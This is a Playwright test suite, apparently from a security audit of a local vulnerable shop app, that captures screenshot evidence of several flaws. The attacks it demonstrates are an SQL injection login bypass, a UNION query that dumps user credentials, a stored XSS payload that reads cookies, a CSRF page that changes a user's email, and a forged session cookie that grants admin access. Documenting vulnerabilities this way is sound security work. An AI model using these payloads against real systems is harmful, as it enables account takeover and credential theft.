import { test, expect } from '@playwright/test';
import fs from 'fs';
import path from 'path';

const API = 'http://localhost:3000';
// screenshots/ at repo root (per D13 naming convention)
const SHOTS = path.resolve(process.cwd(), '../../screenshots');
const results: Record<string, string> = {};

test.describe('security evidence capture', () => {
  test('F01a login bypass via SQLi', async ({ page }) => {
    await page.goto('/login');
    // payload passes HTML5 email validation (no spaces before @) AND bypasses auth:
    // SQL becomes: WHERE email='x'/**/OR/**/1=1--@b.bb' AND password='x'
    await page.fill('input[type=email]', "x'/**/OR/**/1=1--@b.bb");
    await page.fill('input[type=password]', 'x');
    await page.click('button[type=submit]');
    await page.waitForURL('http://localhost:5173/');
    await page.waitForTimeout(1500);
    const stored = await page.evaluate(() => localStorage.getItem('user'));
    // bypass returns user id=1 (admin) stored in localStorage
    const loggedIn = !!stored && stored.includes('"role":"admin"');
    results['F01a_login_bypass'] = loggedIn ? 'logged-in-as-admin-id-1' : 'unknown';
    await page.screenshot({ path: `${SHOTS}/01a-login-sqli-bypass.png`, fullPage: true });
  });

  test('F01b UNION dump via search', async ({ page }) => {
    // product card renders name/category/price only, so concatenate creds into the name column
    const q = "' UNION SELECT NULL,email||' / '||password,NULL,NULL,role,NULL FROM users--";
    await page.goto('http://localhost:5173/products?q=' + encodeURIComponent(q));
    await page.waitForTimeout(3000);
    const body = await page.locator('body').innerText();
    results['F01b_union_dump'] =
      body.includes('admin@fashionhub.dev / admin123') ? 'creds-visible' : 'not-visible';
    await page.screenshot({ path: `${SHOTS}/01b-search-union-dump.png`, fullPage: true });
  });

  test('F02 stored XSS payload stored via API (admin render verified manually)', async ({ request }) => {
    const res = await request.post(`${API}/api/products/1/reviews`, {
      data: {
        author: 'mallory',
        rating: 5,
        content: '<img src=x onerror="alert(document.cookie)">',
      },
    });
    expect(res.status()).toBe(201);
    const body = await res.json();
    results['F02_xss_stored'] = body.content.includes('onerror') ? 'raw-html-stored' : 'sanitized';
  });

  test('F03 CSRF via external PoC page', async ({ page, request }) => {
    // login as alice in the browser first
    await page.goto('/login');
    await page.fill('input[type=email]', 'alice@fashionhub.dev');
    await page.fill('input[type=password]', 'alice123');
    await page.click('button[type=submit]');
    await page.waitForTimeout(2000);

    // visit the attacker page (served locally) which auto-submits the CSRF form
    await page.goto('http://localhost:4444/csrf-poc.html');
    await page.waitForTimeout(1500);
    await page.screenshot({ path: `${SHOTS}/03a-csrf-poc-html.png`, fullPage: true });

    // verify the email actually changed (also persisted server-side)
    const apiEmail = await (await request.get(`${API}/api/profile`)).json().catch(() => null);
    await page.goto('/profile');
    await page.waitForTimeout(1500);
    const body = await page.locator('body').innerText();
    results['F03_csrf_email_change'] =
      body.includes('hacked@evil.com') || (apiEmail && apiEmail.email === 'hacked@evil.com')
        ? 'email-changed'
        : 'not-changed';
    await page.screenshot({ path: `${SHOTS}/03b-email-changed-profile.png`, fullPage: true });
  });

  test('F04 session forgery: cookie=1 grants admin', async ({ page }) => {
    await page.context().addCookies([
      { name: 'session', value: '1', domain: 'localhost', path: '/', secure: true, sameSite: 'None' },
    ]);
    await page.goto('/admin');
    await page.waitForTimeout(1500);
    const body = await page.locator('body').innerText();
    results['F04_session_forgery'] = body.includes('Admin Panel') ? 'admin-access-granted' : 'denied';
    await page.screenshot({ path: `${SHOTS}/04f-session-forgery.png`, fullPage: true });
  });

  test.afterAll(async () => {
    fs.writeFileSync(`${SHOTS}/evidence-summary.json`, JSON.stringify(results, null, 2));
    console.log('EVIDENCE SUMMARY:', JSON.stringify(results, null, 2));
  });
});
